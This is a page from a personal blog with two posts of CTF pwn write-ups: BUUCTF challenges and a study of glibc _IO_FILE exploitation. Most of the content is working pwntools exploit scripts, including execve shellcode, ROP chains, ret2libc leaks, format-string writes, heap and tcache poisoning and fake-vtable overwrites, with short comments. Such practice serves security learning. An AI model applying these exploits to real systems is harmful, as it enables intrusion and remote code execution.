from pwn  import *
context(log_level = &#39;debug&#39;, arch = &#39;i386&#39;, os = &#39;linux&#39;)
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p=remote(&#39;node3.buuoj.cn&#39;,26912)
#p=process(&#39;./orw&#39;)

shellcode=asm(&#39;mov eax,5;xor ecx,ecx;xor edx,edx;push ecx;push 0x67616c66;mov ebx,esp;int 0x80;mov ebx,3;mov ecx,esp;mov edx,0x50;mov eax,3;int 0x80;mov eax,4;mov ebx,1;int 0x80;&#39;)
#open(&#39;flag&#39;,0,0) eax=5 ebx=esp ecx=0 edx=0
#read(3,esp,0x50) eax=3 ebx=3 ecx=esp edx=0x50
#write(1,esp,0x50)eax=4 ebx=1 
#gdb.attach(p,&#39;b*0x804858A&#39;)
recv = p.recvuntil(&#39;:&#39;)
p.sendline(shellcode)
flag = p.recv(100)
print flag
</code></pre>
<p>è¿™ä¸ªä¸èƒ½å¤ªä¾èµ– pwntools è‡ªå¸¦çš„ syscall ,è¿˜æ˜¯è‡ªå·±å†™æœ€ç¨³</p>
<h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h2><pre><code>from pwn import *
context.log_level = &#39;debug&#39;
#p = process(&#39;./start&#39;)
p = remote(&quot;node3.buuoj.cn&quot;,29590)
pay = &#39;a&#39;*0x14+p32(0x08048087)
#gdb.attach(p,&#39;b *0x08048087&#39;)
p.recvuntil(&#39;CTF:&#39;)
p.send(pay)
leak = u32(p.recv(4))
shellcode=&#39;a&#39;*0x14+p32(leak+0x14)+&#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;
p.send(shellcode)
p.interactive()
</code></pre>
<hr>
<p>4.11 æ—¥å‰åŠ³åŠ¨æˆæœ,ç›®å‰æ’å 143 ,åˆ†æ•° 331 ,ç°åœ¨å¼€å§‹çœ‹çœ‹å †,å…¨å¿˜å…‰äº†~~~</p>
<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><pre><code>from pwn import *
#p = process(&#39;./fm&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,25972)
payload = fmtstr_payload(11, &#123;0x0804A02C:4&#125;)
p.sendline(payload)
p.interactive()
</code></pre>
<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>???</p>
<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><pre><code>from pwn import *
#p = process(&#39;./guestbook&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,25907)
p.send(&#39;a&#39;*136+p64(0x400620))
p.interactive()
</code></pre>
<h2 id="BJDCTF-2nd-test"><a href="#BJDCTF-2nd-test" class="headerlink" title="[BJDCTF 2nd]test"></a>[BJDCTF 2nd]test</h2><p>è¿™é¢˜æˆ‘ä¸€å¼€å§‹æ€è·¯æ˜¯æŠŠæ–‡ä»¶ scp ä¸‹æ¥(<code>scp -P 27993 ctf@node3.buuoj.cn:/home/ctf/test /home/pic/Downloads</code>)ç”¨æº¢å‡ºçš„æ–¹å¼æ‰“,æ²¡æƒ³åˆ°å‡ ä¸ªå‘½ä»¤å°±è¡Œ??</p>
<p>ä¹‹åçœ‹äº†çœ‹ç½‘ä¸Šçš„ wp ç”¨<code>ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;</code>æ‰¾åˆ°<code>x86_64</code> å’Œ <code>od *</code>ä¸¤ä¸ªå‘½ä»¤èƒ½å¤Ÿ</p>
<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>è¿™é¢˜å’Œä¹‹å‰çš„å¤ªç±»ä¼¼äº†,ä¸å†™äº†,å†™ä¸€ä¸‹ä¹‹åå¾—ç”¨ä¸‡èƒ½ gadget çš„</p>
<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./level3_x64&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,29545)
elf = ELF(&#39;./level3_x64&#39;)
libc = elf.libc
libc=ELF(&#39;libc-2.23.so&#39;)
plt = elf.plt[&#39;write&#39;]
got = elf.got[&#39;write&#39;]
#libc = ELF(&#39;libc.so.6&#39;)
payload = &#39;a&#39;*136+p64(0x4006AA)+p64(0)+p64(1)+p64(got)+p64(8)+p64(got)+p64(1)+p64(0x400690)+p64(0)*7+p64(0x04005E6)
p.recvuntil(&#39;Input&#39;)
p.sendline(payload)

#edi esi edx
#  1 got   8
off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
libc_base = off - libc.symbols[&quot;write&quot;]
print hex(libc_base)
sys = libc_base+libc.symbols[&quot;system&quot;]
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
#gdb.attach(p,&#39;b*0x400619&#39;)
payload = &#39;a&#39;*136+p64(0x04006B3)+p64(sh)+p64(sys)
p.sendline(payload)
p.interactive()
</code></pre>
<p>ä¸‡èƒ½ gadget åˆ©ç”¨</p>
<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./level4&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,26628)
elf = ELF(&#39;./level4&#39;)
#libc = elf.libc
libc=ELF(&#39;libc-2.23.so&#39;)
plt = elf.plt[&#39;write&#39;]
got = elf.got[&#39;write&#39;]
#libc = ELF(&#39;libc.so.6&#39;)
payload = &#39;a&#39;*140+p32(plt)+p32(0x804844B)+p32(1)+p32(got)+p32(4)
p.sendline(payload)
off = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
libc_base = off - libc.symbols[&quot;write&quot;]
print hex(libc_base)
sys = libc_base+libc.symbols[&quot;system&quot;]
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
#gdb.attach(p,&#39;b*0x400619&#39;)
payload = &#39;a&#39;*140+p32(sys)+p32(sh)*2
p.sendline(payload)
p.interactive()
</code></pre>
<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><pre><code>from pwn import *
p=process(&#39;heapcreator&#39;)
context.log_level = &#39;debug&#39;
elf=ELF(&#39;heapcreator&#39;)
libc=elf.libc
def create(size,content):
	p.sendafter(&#39;choice&#39;,&#39;1&#39;)
	p.sendafter(&#39;Size of Heap&#39;,str(size))
	p.sendafter(&#39;Content of heap&#39;,content)
def edit(ind,content):
	p.sendafter(&#39;choice&#39;,&#39;2&#39;)
	p.sendafter(&#39;Index&#39;,str(ind))
	p.sendafter(&#39;Content of heap&#39;,content)
def show(ind):
	p.sendafter(&#39;choice&#39;,&#39;3&#39;)
	p.sendafter(&#39;Index&#39;,str(ind))
def delete(ind):
	p.sendafter(&#39;choice&#39;,&#39;4&#39;)
	p.sendafter(&#39;Index&#39;,str(ind))

free_got = elf.got[&quot;free&quot;]
create(0x18,&#39;a&#39;)
create(0x10,&#39;b&#39;)
edit(0,&#39;/bin/sh\x00&#39;+&#39;a&#39;*0x10+p64(0x41))
delete(1)
create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
show(1)
off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
base = off-libc.symbols[&quot;free&quot;]
sys = base+libc.symbols[&quot;system&quot;]
edit(1,p64(sys))
delete(0)
gdb.attach(p)
p.interactive()
</code></pre>
<h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./ACTF_2019_babystack&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,29828)
elf = ELF(&#39;./ACTF_2019_babystack&#39;)
#libc = elf.libc
libc=ELF(&#39;libc-2.27.so&#39;)
p.recvuntil(&#39;message?\n&#39;)
p.sendline(&#39;224&#39;)
p.recvuntil(&#39;0x&#39;)
stack = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
got = elf.got[&#39;puts&#39;]
plt = elf.plt[&#39;puts&#39;]
payload = &#39;a&#39;*8+p64(0x400AD3)+p64(got)+p64(plt)+p64(0x4008F6)
payload = payload.ljust(208)
payload+= p64(stack)+p64(0x400A18)
p.recvuntil(&#39;content&#39;)
p.send(payload)
off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
libc_base = off - libc.symbols[&quot;puts&quot;]
print hex(libc_base)

p.recvuntil(&#39;message?\n&#39;)
p.sendline(&#39;224&#39;)
p.recvuntil(&#39;0x&#39;)
stack = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
sys = libc_base+libc.symbols[&quot;system&quot;]
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
one = libc_base+0x4f322
payload = &#39;a&#39;*8+p64(one)
payload = payload.ljust(208,&#39;\x00&#39;)
payload+= p64(stack)+p64(0x400A18)
p.recvuntil(&#39;content&#39;)
#gdb.attach(p,&#39;b*0x0400A18&#39;)
p.send(payload)

p.interactive()
</code></pre>
<p>å¸¸è§„æ ˆè¿ç§»</p>
<h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h2><pre><code>from pwn import *
#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./oneshot_tjctf_2016&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,28491)
elf = ELF(&#39;./oneshot_tjctf_2016&#39;)
#libc = elf.libc
libc=ELF(&#39;libc-2.23.so&#39;)
got=elf.got[&quot;puts&quot;]
p.recvuntil(&#39;location?&#39;)
p.sendline(str(got))
p.recvuntil(&#39;0x&#39;)
base =int(p.recvuntil(&#39;\n&#39;)[:-1],16)-libc.symbols[&quot;puts&quot;]
print hex(base)
one = base +0xf1147
print hex(one)
p.recvuntil(&#39;location?&#39;)
#gdb.attach(p,&#39;b*0x4006BB&#39;)
p.sendline(str(one))
p.interactive()
</code></pre>
<p>one_gadget åˆ©ç”¨</p>
<h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h2><pre><code>from pwn import *
#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./login&#39;)
context.log_level = &#39;debug&#39;
#p=remote(&#39;node3.buuoj.cn&#39;,29037)
elf = ELF(&#39;./login&#39;)
libc = elf.libc
p.recvuntil(&#39;:&#39;)
p.sendline(&#39;admin&#39;)
p.recvuntil(&#39;:&#39;)
gdb.attach(p,&#39;b*0x400a4a&#39;)
payload = &#39;2jctf_pa5sw0rd\x00&#39;+&#39;\x00&#39;*57+p64(0x400E88)
p.sendline(payload)

p.interactive()
</code></pre>
<p>è¿™é¢˜å±å®æ²¡çœ‹æ‡‚,æœ€åä¸€ç‚¹ä¸€ç‚¹è°ƒå‡ºæ¥çš„,çœ‹ wp ä¹Ÿçœ‹ä¸å¤ªæ‡‚ï¼Œè‡ªå·±æ•²äº†æ•²è¯•å‡ºæ¥äº†</p>
<h1 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h1><p>è¿™é¢˜å¾ˆç®€å•ï¼Œå°±æ˜¯é€ä¸€ä¸ªåœ°å€ç„¶åæŸ¥çœ‹åœ°å€å†…å®¹ã€‚ç„¶åæˆ‘å‘ç°æˆ‘çœŸæ˜¯æœ‰ç‚¹å‘†ï¼Œé€šè¿‡æœ¬åœ°è°ƒè¯•æŸ¥çœ‹åç§»é‡ï¼Œå‘ç°åç§»é‡ä¸å¤§ã€‚æˆ‘å°±æƒ³æœ¬åœ°çˆ†ç ´ï¼Œæˆ‘é ã€‚ã€‚ã€‚å‘ç°è‡ªå·±çœŸæ˜¯é€†å‘é‚£è¾¹å¥—è·¯å­¦å¤šäº†ï¼Œä¸è¡Œä¸è¡Œã€‚çœ‹äº† wp å‘ç°æ˜¯ç”¨ got è¡¨ï¼Œæˆ‘æ€ä¹ˆæ²¡æƒ³åˆ°~~~æˆ‘çœŸæœäº†ï¼Œè€Œä¸”è¿™è·¯èµ°ä¸é€šã€‚å‡½æ•°é™å®šåœ°å€å¤§å°å°äº<code>0x7fffffff</code></p>
<pre><code>from pwn import *
context.log_level = &#39;debug&#39;
p = process(&#39;ret2lib&#39;)
elf = ELF(&#39;ret2lib&#39;)
libc=elf.libc
got = elf.got[&quot;puts&quot;]
shellcode = got
p.recvuntil(&#39;:&#39;)
p.send(str(shellcode))
p.recvuntil(&#39;address : &#39;)
plt = int(p.recvuntil(&#39;\n&#39;),16)
libc_base = plt-libc.symbols[&quot;puts&quot;]
print hex(libc_base)
gdb.attach(p)
sys = libc_base+libc.symbols[&quot;system&quot;]
sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
p.sendline(&#39;a&#39;*60+p32(sys)+&#39;\x01&#39;*4+p32(sh))
p.interactive()
</code></pre>
<h1 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h1><p>è¿™é¢˜æˆ‘å¯¹ rop åˆè¿›ä¸€æ­¥ç†è§£äº†ä¸€ä¸‹ï¼Œä¸€å¼€å§‹æˆ‘è¿˜å¾ˆè‡ªä¿¡ï¼Œè§‰å¾—ç›´æ¥ ropchain ç›´æ¥ç”©å°±è¡Œï¼Œåæ¥é€šè¿‡ ida å‘ç°é™åˆ¶äº†å­—èŠ‚æ•°ï¼ŒçœŸæ˜¯ä¸€ä¸ªå­—èŠ‚ä¸å¤šã€‚äºæ˜¯</p>
<pre><code>from pwn import *
from struct import pack
context.log_level = &#39;debug&#39;
io = process(&#39;simplerop&#39;)
p = &#39;&#39;
p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
p += &#39;/bin&#39;
p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4
p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
p += &#39;//sh&#39;
p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret
p += pack(&#39;&lt;I&#39;, 0) 
p += pack(&#39;&lt;I&#39;, 0) 
p += pack(&#39;&lt;I&#39;, 0x080ea060) 
p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
p += pack(&#39;&lt;I&#39;, 11)
p += pack(&#39;&lt;I&#39;, 0x080493e1) # int 0x80
io.recvuntil(&#39;:&#39;)
io.send(&#39;a&#39;*32+p)
io.interactive(
</code></pre>
<p>å…¶å® ropchain ç”Ÿæˆçš„æ˜æ˜¾æœ‰å¤šä½™çš„ï¼Œæ‰€ä»¥èƒ½å¤Ÿè¿›è¡Œå¤§èŒƒå›´çš„åŒ–ç®€ï¼ˆ23è¡Œ&#x3D;&gt;6è¡Œ</p>
<h1 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h1><p>å¡ä½äº†ï¼Œæ˜¨å¤©åšæ¢¦éƒ½æƒ³è¿™é¢˜ï¼Œç„¶åè§‰å¾—è¿™æ–¹æ³•å·²ç»è§£å†³äº†ï¼Œä½†æ˜¯å¥½åƒè¿˜æ˜¯å› ä¸ºå †æ ˆçš„é—®é¢˜æ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> çš„æ—¶å€™æ­»äº†ï¼Œå°±å¾ˆéš¾å—</p>
<pre><code>from pwn import *
context.log_level = &#39;debug&#39;
io = process(&#39;migration&#39;)
elf = ELF(&#39;migration&#39;)
libc = elf.libc
got = elf.got[&quot;puts&quot;]
io.recvuntil(&#39;\n&#39;)
io.send(&#39;a&#39;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got))
sleep(0.1)
real = u32(io.recv(4))
base = real - libc.symbols[&quot;puts&quot;]
one = base+0x3ac69
io.send(p32(0)+p32(one)+p32(0)*8+p32(0x804A008+0x500)+p32(0x8048504))
io.interactive()
</code></pre>
<p>ä¸€å®šè¦æ³¨æ„ bss ç«¯å¾—èº²ä¸€å—ï¼Œä¸ç„¶æœ€åèµ· shell èµ·ä¸æ¥ï¼Œè¿™ä¸ªå…·ä½“æˆ‘è¿˜æ²¡ç ”ç©¶ï¼Œæ¶‰åŠåˆ°å†…æ ¸äº†</p>
<h1 id="lab7ï¼ˆlab8åŒç†"><a href="#lab7ï¼ˆlab8åŒç†" class="headerlink" title="lab7ï¼ˆlab8åŒç†"></a>lab7ï¼ˆlab8åŒç†</h1><pre><code>from pwn import *
from struct import pack
context.log_level = &#39;debug&#39;
io = process(&#39;crack&#39;)
io.recvuntil(&#39;?&#39;)
payload = fmtstr_payload(10, &#123;0x0804A048:123&#125;)
io.send(payload)
io.recvuntil(&#39;:&#39;)
io.send(&#39;123&#39;)
io.interactive()
</code></pre>
<p>pwntools nb å°±å®Œäº‹äº†</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/07/31/2020-07-31-buuctf/" data-id="cuidmyOWab5-rtW1FoyWo-Pbq" data-title="pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-07-31-io" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/31/2020-07-31-io/" class="article-date">
  <time class="dt-published" datetime="2020-07-30T16:00:00.000Z" itemprop="datePublished">2020-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/31/2020-07-31-io/">IO_file</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Pic4xiuâ€™s-note-for-IOFILE"><a href="#Pic4xiuâ€™s-note-for-IOFILE" class="headerlink" title="Pic4xiuâ€™s note for IOFILE"></a>Pic4xiuâ€™s note for IOFILE</h1><h3 id="IO-FILE-Source-code"><a href="#IO-FILE-Source-code" class="headerlink" title="_IO_FILE Source code"></a>_IO_FILE Source code</h3><pre><code>struct _IO_FILE &#123;
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
&#125;;
</code></pre>
<h3 id="Some-common-sense"><a href="#Some-common-sense" class="headerlink" title="Some common sense"></a>Some common sense</h3><p>stdinã€stdoutã€stderr are in the libc.so data segment (automatically opened) ï¼ŒBut the file stream created by fopen is in the heap</p>
<pre><code>_IO_2_1_stderr_
_IO_2_1_stdout_
_IO_2_1_stdin_
//what they look like

struct _IO_FILE_plus
&#123;
    _IO_FILE    file;
    IO_jump_t   *vtable;//The 32-bit offset is 0x94, while the 64 bit offset is 0xd8
&#125;
</code></pre>
<p>Look at the picture below , VTable has function pointers below that can jump</p>
<p><img src="https://s2.ax1x.com/2020/02/14/1j9eoT.png" alt="image"></p>
<h1 id="Some-exercises"><a href="#Some-exercises" class="headerlink" title="Some exercises"></a>Some exercises</h1><h3 id="fake-vtable"><a href="#fake-vtable" class="headerlink" title="fake_vtable"></a>fake_vtable</h3><blockquote>
<p>The_end ( hctf )</p>
</blockquote>
<pre><code>#coding=utf8
from pwn import *
context.log_level = &#39;debug&#39;
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
local = 1
elf = ELF(&#39;./the_end&#39;)
if local:
    p = process(&#39;the_end&#39;)
    libc = ELF(&#39;./libc.so.6&#39;)
else:
    p = remote(&#39;116.85.48.105&#39;,5005)
    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)
        gdb.attach(p,&#39;b *&#123;&#125;&#39;.format(hex(text_base+addr)))
    else:
        gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))

def bk(addr):
    gdb.attach(p,&quot;b *&quot;+str(hex(addr)))
debug(0x000964)
ru(&quot;gift &quot;)
sleep_addr = int(rc(14),16)
libc_base = sleep_addr - libc.symbols[&#39;sleep&#39;]
onegadget = libc_base + 0xf02a4
vtable = libc_base + 0x39c6f8
fake_vtable = vtable - 0x90
fake_setbuf = fake_vtable + 88
print &quot;libc_base---&gt;&quot; + hex(libc_base)
print &quot;vtable---&gt;&quot; + hex(vtable)
print &quot;fake_vtable---&gt;&quot; + hex(fake_vtable)
print &quot;fake_setbuf---&gt;&quot; + hex(fake_setbuf)
print &quot;onegadget---&gt;&quot; + hex(onegadget)
for i in range(2):
    sd(p64(vtable+i))
    sd(p64(fake_vtable)[i])
for i in range(3):
    sd(p64(fake_setbuf+i))
    sd(p64(onegadget)[i])

p.interactive()
</code></pre>
<p>I think itâ€™s very easy , just modify <code>_IO_2_1_stdout_</code> vtable addr to a fake_vtable , then use itâ€™s fake_setbuf to point onegadget . And this practice has another method : utilize <code>exit</code> execute <code>_dl_fini</code> , <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-248495.htm">See for details</a></p>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><blockquote>
<p>bms ( ciscn )</p>
</blockquote>
<pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./pwn&#39;)
elf = ELF(&#39;./pwn&#39;)
libc = elf.libc
context.log_level = &#39;debug&#39;

p.recvuntil(&#39;username:&#39;)
p.sendline(&#39;admin&#39;)
p.recvuntil(&#39;password:&#39;)
p.sendline(&#39;frame&#39;)

def create(name,size,context):
    p.sendlineafter(&#39;&gt;\n&#39;,&#39;1&#39;)
    p.sendafter(&#39;book name:&#39;,name)
    p.sendlineafter(&#39;description size:&#39;,str(size))
    p.sendafter(&#39;description:&#39;,context)

def createe(name,size,context):
    p.sendlineafter(&#39;&gt;&#39;,&#39;1&#39;)
    p.sendafter(&#39;book name:&#39;,name)
    p.sendlineafter(&#39;description size:&#39;,str(size))
    p.sendafter(&#39;description:&#39;,context)

def delete(index):
    p.sendlineafter(&#39;&gt;\n&#39;,&#39;2&#39;)
    p.sendlineafter(&#39;index:&#39;,str(index))

def deletee(index):
    p.sendlineafter(&#39;&gt;&#39;,&#39;2&#39;)
    p.sendlineafter(&#39;index:&#39;,str(index))

#tcathe attack to the IO_File
create(&#39;A&#39;,0x68,&#39;A&#39;*0x68)
delete(0)
delete(0)
create(&#39;A&#39;,0x68,p64(0x602020))
create(&#39;A&#39;,0x68,&#39;A&#39;)
create(&#39;A&#39;,0x68,&#39;\x60&#39;)
create(&#39;A&#39;,0x68,p64(0xfbad1800)+p64(0)*3+&#39;\x90&#39;)

#leak the libc
data = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
libc_base = data - 4114403
system_addr = libc_base + libc.symbols[&#39;system&#39;]
free_addr = libc_base + libc.symbols[&#39;__free_hook&#39;]
log.success(&#39;libc base is :&#39;+hex(libc_base))

#tcache attack to __free_hook
createe(&#39;A&#39;,0x30,&#39;A&#39;)#5
deletee(5)
deletee(5)
createe(&#39;A&#39;,0x30,p64(free_addr))#6
createe(&#39;A&#39;,0x30,&#39;/bin/sh&#39;)#7
createe(&#39;A&#39;,0x30,p64(system_addr))#8

#trigger
deletee(7)

p.interactive()
</code></pre>
<p>This exercise combined tcache , very interesting !</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/07/31/2020-07-31-io/" data-id="cuidN4SZUdgCPo-QYg82Xr3AR" data-title="IO_file" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
